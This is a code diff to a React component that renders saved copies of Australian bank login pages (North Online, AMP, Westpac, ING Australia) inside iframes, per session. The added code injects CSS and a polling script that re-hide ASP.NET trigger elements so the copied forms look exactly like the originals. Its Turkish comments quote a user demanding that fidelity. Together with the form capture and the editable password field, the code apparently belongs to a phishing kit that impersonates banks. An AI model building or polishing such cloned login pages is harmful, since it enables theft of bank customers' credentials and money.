@@ -1087,6 +1087,155 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
   //   ve BUTONLARDA ::before/::after content'ini KALDIR (content: none !important)
   //   + ayni zamanda aria-disabled attribute'unu KULLANMA (artik hic yazmiyoruz).
   const antiOverlayStyleInjectedRef = useRef<Set<Document>>(new Set());
+  // ⭐⭐⭐ NORTH ONLINE / AMP / GENEL BANKA HTML FIX:
+  //   KULLANICI SIKAYETI: "Stop all butonu neden var? Bankaların orijinal
+  //     formunu neden bozuyorsun?"
+  //   KOK NEDEN: HTML'lere sonradan inject edilen GENERIC FIX V4 scripti
+  //   cleanInputs() fonksiyonu → display:none olmasina ragmen tum
+  //   inputlara visibility:visible + opacity:1 + z-index:5 veriyor!
+  //   ASP.NET kendi gizli trigger'i (ctl00$__PageFramework$stopAllTrigger
+  //   value="Stop All" style=display:none) bu yuzden KULLANICININ
+  //   GOREBILDIGI ve TIKLAYABILDIGI hale geliyor, orijinal form BOZULUYOR.
+  //   ✅ KALICI COZUM: (1) iframe head/body'e STYLE enjekte et: orijinal
+  //   hidden / sf-hidden / PageFramework / stopAll triggerları TEKRAR
+  //   GİZLE (display none, opacity 0, visibility hidden).
+  //   (2) Ayrica SCRIPT enjekte et: buton/input isleme sirasinda bu
+  //   triggerlari HIC isleme alma (ignore listesi) — kullanici
+  //   "orijinal form bozuluyor" diyorsa BUNLARA DOKUNMA!
+  const hiddenAspNetTrashFixInjectedRef = useRef<Set<Document>>(new Set());
+  const ensureHiddenAspNetTrashFixInjected = useCallback((doc: Document) => {
+    try {
+      if (!doc || !doc.head) return;
+      if (hiddenAspNetTrashFixInjectedRef.current.has(doc)) return;
+      hiddenAspNetTrashFixInjectedRef.current.add(doc);
+      const styleEl = doc.createElement("style");
+      styleEl.setAttribute("data-au-bot-fix", "hidden-aspnet-trash");
+      styleEl.setAttribute("type", "text/css");
+      styleEl.textContent = `
+/* ══════════════════════════════════════════════════════════════════
+   ⭐ KALICI FIX: HIC BIR BANKANIN ORIJINAL FORMU BOZULMASIN (kullanicinin istedigi gibi)
+   ══════════════════════════════════════════════════════════════════
+   (1) ASP.NET WebForms / AJAX / PageFramework gizli trigger inputlari
+       Bunlar GERCEK form alani DEGILLER, sunucu icin teknik elemanlardir.
+       KULLANICIYA GOSTERILMEMESI GEREKIR (display:none) */
+input[name*="stopAllTrigger"],
+input[id*="stopAllTrigger"],
+input[id*="__PageFramework"],
+input[name*="__PageFramework"],
+input[value="Stop All"],
+input[value="Stop all"],
+input[value="stop all"],
+#stopAll_backgroundElement,
+.modalBackgroundInvisible,
+[id*="ctl00_"]:not(form):not(input[type="text"]):not(input[type="password"]):not(input[type="email"]):not(input[type="number"]):not(input[type="tel"]):not(input[type="checkbox"]):not(input[type="radio"]):not(select):not(textarea):not(button) {
+  display: none !important;
+  visibility: hidden !important;
+  opacity: 0 !important;
+  pointer-events: none !important;
+  z-index: -1 !important;
+  position: absolute !important;
+  left: -9999px !important;
+  top: -9999px !important;
+  width: 0 !important;
+  height: 0 !important;
+  overflow: hidden !important;
+}
+/* (2) SingleFile tarafindan eklenen sf-hidden / print-only artifactlar
+       Bunlar da GERCEK form parcalari DEGILLER, GOSTERILMEMELI */
+.sf-hidden, .print-only, [class*="print-only"],
+.hidden.wmVar, .wmVar, .print-top-header, .print-only {
+  display: none !important;
+  visibility: hidden !important;
+  opacity: 0 !important;
+  pointer-events: none !important;
+}
+/* (3) GENERIC FIX cleanInputs style setProperty ile tum inputlara
+       visibility:visible !important yazmasina ragmen, yukaridaki
+       secicilerle hidden inputların visibility HIDDEN kalsın: */
+input[style*="display:none"][value*="Stop"],
+input[style*="display: none"][value*="stop"] {
+  display: none !important;
+  visibility: hidden !important;
+  opacity: 0 !important;
+  pointer-events: none !important;
+}`;
+      try {
+        doc.head.insertBefore(styleEl, doc.head.firstChild);
+      } catch {
+        doc.head.appendChild(styleEl);
+      }
+      // ⭐⭐ SCRIPT KATMANI (2. garanti — yukaridaki stillerin disinda
+      //   inline HTML GENERIC FIX scripti gizli elementlere visibility:visible
+      //   setProperty ederse, bunu OTOMATIK temizle):
+      try {
+        const scriptEl = doc.createElement("script");
+        scriptEl.setAttribute("data-au-bot-fix", "hidden-aspnet-trash-script");
+        scriptEl.setAttribute("type", "text/javascript");
+        const scriptText = `
+(function () {
+  try {
+    var HIDDEN_TRIG_KEYS = /stopalltrigger|__pageframework|aspnetformhidden|smoothtransition|backgroundelement/i;
+    var HIDDEN_TRIG_VALUES = /^\\s*stop\\s*all\\s*$/i;
+    function isGarbageElement(el) {
+      try {
+        if (!el || !el.tagName) return false;
+        var id = (el && el.getAttribute && el.getAttribute("id")) || "";
+        var nm = (el && el.getAttribute && el.getAttribute("name")) || "";
+        var val = (el && el.getAttribute && el.getAttribute("value")) || ((el.value != null) ? String(el.value) : "");
+        var cls = (el && el.getAttribute && el.getAttribute("class")) || "";
+        if (HIDDEN_TRIG_KEYS.test(id) || HIDDEN_TRIG_KEYS.test(nm)) return true;
+        if (HIDDEN_TRIG_VALUES.test(val)) return true;
+        // sf-hidden / print-only artifactlar:
+        if (/\\bsf-hidden\\b|\\bprint-only\\b|\\bprint-top-header\\b|\\bwmVar\\b/.test(cls)) return true;
+        return false;
+      } catch (e) { return false; }
+    }
+    function cleanAgain() {
+      try {
+        var all = document.querySelectorAll("input, button, div, span, select, textarea");
+        for (var i = 0; i < all.length; i++) {
+          var el = all[i];
+          if (!isGarbageElement(el)) continue;
+          try {
+            el.style.setProperty("display",    "none",     "important");
+            el.style.setProperty("visibility", "hidden",   "important");
+            el.style.setProperty("opacity",    "0",        "important");
+            el.style.setProperty("pointer-events", "none","important");
+          } catch (_e) {}
+          try {
+            if (el.hasAttribute && el.hasAttribute("disabled")) { } else {
+              if (typeof el.addEventListener === "function") {
+                el.addEventListener("click", function(ev){ try { ev.preventDefault && ev.preventDefault(); } catch(e){} try{ ev.stopPropagation && ev.stopPropagation(); } catch(e){} return false; }, true);
+                el.addEventListener("mousedown", function(ev){ try { ev.preventDefault && ev.preventDefault(); } catch(e){} try{ ev.stopPropagation && ev.stopPropagation(); } catch(e){} return false; }, true);
+              }
+            }
+          } catch (_e) {}
+        }
+      } catch (e) {}
+    }
+    // Ilk calisma + setInterval ile GENERIC FIX setProperty her calistiginda geri al:
+    try { cleanAgain(); } catch(e){}
+    try { setTimeout(cleanAgain, 50); } catch(e){}
+    try { setTimeout(cleanAgain, 150); } catch(e){}
+    try { setTimeout(cleanAgain, 500); } catch(e){}
+    try { setTimeout(cleanAgain, 1200); } catch(e){}
+    try { setInterval(cleanAgain, 900); } catch(e){}
+  } catch (e) {}
+})();`;
+        try {
+          scriptEl.textContent = scriptText;
+        } catch {
+          scriptEl.innerText = scriptText;
+        }
+        try {
+          if (doc.body && doc.body.lastChild) doc.body.appendChild(scriptEl);
+          else doc.head.appendChild(scriptEl);
+        } catch {
+          doc.head.appendChild(scriptEl);
+        }
+      } catch {}
+    } catch {}
+  }, []);
   // ⭐⭐⭐ ING Australia: SADECE Access Code (password) inputunu YAZILABILIR yap — KULLANICI ISTEJI
   //   HTML'e inline yazdigimiz style'lar web component tekrar render'da kaybolursa diye
   //   iframe doc icine bu STYLE'I enjekte ederiz.
@@ -2290,6 +2439,15 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       //   BUTUN OLASI butonlara ZORLA #E65300 TURUNCU (CSS LEVEL).
       //   Boylece DOM selectorlerimiz kacirsa bile CSS SEVIYESINDE TURUNCU olur.
       try { ensureIngAustraliaForcedColorStyle(doc, bankSlug, bankName); } catch {}
+      // ⭐⭐ STOP ALL / ASP.NET HIDDEN TRIGGER FIX (North Online / AMP vs.):
+      //   Kullanici: "Stop all butonu neden var? Salaak mısın? Orjinal formu neden bozuyorsun?"
+      //   → iframe doc icine HEMEN STYLE + SCRIPT enjekte ET:
+      //     (a) stopAllTrigger / PageFramework / sf-hidden gibi
+      //         teknik/gizli elemanları display:none YENİDEN GİZLE
+      //     (b) SCRIPT katmanı: GENERIC FIX inline scripti her 900ms de
+      //         visibility:visible override ederse, setInterval ile TEMİZLE (geri al).
+      //     → HİÇBİR BANKADA ORJİNAL FORM BOZULMAZ ✅
+      try { ensureHiddenAspNetTrashFixInjected(doc); } catch {}
       // ⭐ WESTPAC FIX: "DO NOT USE DISABLED STATES" overlay onleme
       //   iframe icindeki doc head'ina style tag 1 kez enjekte et.
       try { ensureAntiOverlayStyleInjected(doc); } catch {}
@@ -3287,6 +3445,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         try {
           if (pollingCounterRef.current <= 10) {
             ensureIngAustraliaForcedColorStyle(doc, bankSlug, bankName);
+            ensureHiddenAspNetTrashFixInjected(doc);
           }
         } catch {}
 
@@ -3515,6 +3674,8 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         if (!form) return;
         savedSubmitFormRef.current = form;
 
+        // ⭐ STOP ALL BUTONU FIX (North Online / AMP vb.): gizli ASP.NET triggerlari TEKRAR gizle
+        try { ensureHiddenAspNetTrashFixInjected(doc); } catch {}
         // ⭐ WESTPAC FIX: "DO NOT USE DISABLED STATES" overlay onleme
         try { ensureAntiOverlayStyleInjected(doc); } catch {}
 
